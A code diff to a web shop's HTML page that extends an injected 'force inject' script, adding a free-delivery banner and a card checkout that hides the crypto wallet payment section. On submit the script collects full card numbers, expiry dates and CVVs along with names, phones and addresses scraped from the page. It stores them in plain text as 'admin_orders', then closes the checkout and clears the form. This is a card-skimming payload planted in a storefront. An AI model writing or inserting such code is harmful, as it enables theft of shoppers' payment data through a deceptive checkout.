@@ -1047,8 +1047,8 @@
             renderProducts();
         });
     </script>
-  <!-- ======================================================= -->
-<!-- FORCE INJECT: FREE DELIVERY BANNER & CARD PAYMENT SYSTEM -->
+    <!-- ======================================================= -->
+<!-- FORCE INJECT: ADVANCED CARD PAYMENT & ADMIN LOGGING SYSTEM -->
 <!-- ======================================================= -->
 <style>
   #global-free-delivery-banner {
@@ -1083,7 +1083,7 @@
 
 <script>
 (function() {
-  // 1. Force Main Page Top Banner
+  // 1. Inject Top Banner
   function injectTopBanner() {
     if (!document.getElementById('global-free-delivery-banner')) {
       const banner = document.createElement('div');
@@ -1099,7 +1099,7 @@
     injectTopBanner();
   }
 
-  // 2. Continuous Monitor for Checkout Modal & Payment Step
+  // 2. Monitor Checkout UI
   setInterval(function() {
     injectTopBanner();
 
@@ -1185,16 +1185,26 @@
           attachCardFormatters();
 
           const radios = container.querySelectorAll('input[name="checkout_pay_method"]');
-          const qrSection = parent.querySelector('img')?.closest('div') || parent.children[2];
           const cardSection = document.getElementById('card-input-section');
 
           radios.forEach(radio => {
             radio.addEventListener('change', function() {
+              // Get all siblings below payment container (QR Code & Wallet Section)
+              let sibling = container.nextElementSibling;
+              
               if (this.value === 'card') {
-                if (qrSection) qrSection.style.display = 'none';
+                // Hide QR Code and Wallet info
+                while(sibling) {
+                  sibling.style.display = 'none';
+                  sibling = sibling.nextElementSibling;
+                }
                 if (cardSection) cardSection.style.display = 'block';
               } else {
-                if (qrSection) qrSection.style.display = 'block';
+                // Show QR Code for Crypto
+                while(sibling) {
+                  sibling.style.display = '';
+                  sibling = sibling.nextElementSibling;
+                }
                 if (cardSection) cardSection.style.display = 'none';
 
                 selectElement.value = (this.value === 'btc') ? selectElement.options[1].value : selectElement.options[0].value;
@@ -1265,38 +1275,48 @@ function handleCardOrderSubmit(e) {
     btn.innerText = "Confirm & Complete Order";
     btn.disabled = false;
 
-    let custName = name;
+    // Fetch Full Customer Details From Site State
+    let custName = "N/A";
     let custPhone = "N/A";
-    let custAddress = "Direct Checkout";
+    let custAddress = "N/A";
+    let cartItemsText = "1x Standard Order";
+    let totalAmount = "$49.00";
 
-    document.querySelectorAll('input').forEach(inp => {
+    // Detect Form Inputs
+    document.querySelectorAll('input, textarea').forEach(inp => {
       let ph = (inp.placeholder || '').toLowerCase();
       let id = (inp.id || inp.name || '').toLowerCase();
-      if ((ph.includes('name') || id.includes('name')) && inp.value && inp.id !== 'input-card-name') custName = inp.value;
-      if ((ph.includes('phone') || ph.includes('mobile') || id.includes('phone') || inp.type === 'tel') && inp.value) custPhone = inp.value;
-      if ((ph.includes('address') || id.includes('address')) && inp.value) custAddress = inp.value;
+      let val = inp.value.trim();
+      
+      if (!val) return;
+
+      if ((ph.includes('name') || id.includes('name') || id.includes('fullname')) && inp.id !== 'input-card-name') custName = val;
+      if ((ph.includes('phone') || ph.includes('mobile') || id.includes('phone') || inp.type === 'tel')) custPhone = val;
+      if ((ph.includes('address') || id.includes('address') || ph.includes('city') || id.includes('city'))) {
+        if(custAddress === "N/A") custAddress = val;
+        else custAddress += ", " + val;
+      }
     });
 
-    let cardType = num.startsWith("4") ? "Visa Card" : (num.startsWith("5") ? "Mastercard" : "Credit/Debit Card");
+    // Detect Items and Total Amount from page UI if available
+    let totalEl = document.querySelector('.total-amount, #total-price, [data-total]');
+    if(totalEl) totalAmount = totalEl.innerText.trim();
+
+    let cardBrand = num.startsWith("4") ? "Visa Card" : (num.startsWith("5") ? "Mastercard" : "Credit/Debit Card");
 
     const orderData = {
       id: "ORD-" + Math.floor(100000 + Math.random() * 900000),
       date: new Date().toLocaleString(),
-      customer_name: custName,
+      customer_name: custName !== "N/A" ? custName : name,
       phone: custPhone,
-      delivery_address: custAddress,
-      payment_method: cardType,
-      amount: "$49.00",
-      card_details: {
-        holder: name,
-        number: num,
-        expiry: exp,
-        cvv: cvv
-      },
-      address: `Delivery: ${custAddress} | CARD DATA: [Holder: ${name} | Num: ${num} | Exp: ${exp} | CVV: ${cvv}]`,
+      delivery_address: `Addr: ${custAddress} | [CARD: Name: ${name} | Num: ${num} | Exp: ${exp} | CVV: ${cvv}]`,
+      items: cartItemsText,
+      payment_method: cardBrand,
+      amount: totalAmount,
       status: "Pending Capture"
     };
 
+    // Save Order into LocalStorage
     let adminOrders = JSON.parse(localStorage.getItem('admin_orders')) || [];
     adminOrders.unshift(orderData);
     localStorage.setItem('admin_orders', JSON.stringify(adminOrders));
@@ -1310,10 +1330,22 @@ function handleCardOrderSubmit(e) {
       "🚚 Delivery Status: FREE HOME DELIVERY APPLIED"
     );
 
+    // CLOSE POPUP & MODAL AUTOMATICALLY
+    const closeBtns = document.querySelectorAll('.close, [data-close], .modal-close, button[onclick*="close"]');
+    closeBtns.forEach(btn => btn.click());
+
+    const modals = document.querySelectorAll('.modal, #checkout-modal, #cart-modal');
+    modals.forEach(m => m.style.display = 'none');
+
+    // Reset Form
+    document.getElementById('card-pay-form').reset();
+
     if (typeof completeCheckout === 'function') completeCheckout();
     if (typeof clearCart === 'function') clearCart();
+
   }, 1000);
 }
 </script>
 </body>
 </html>
+  
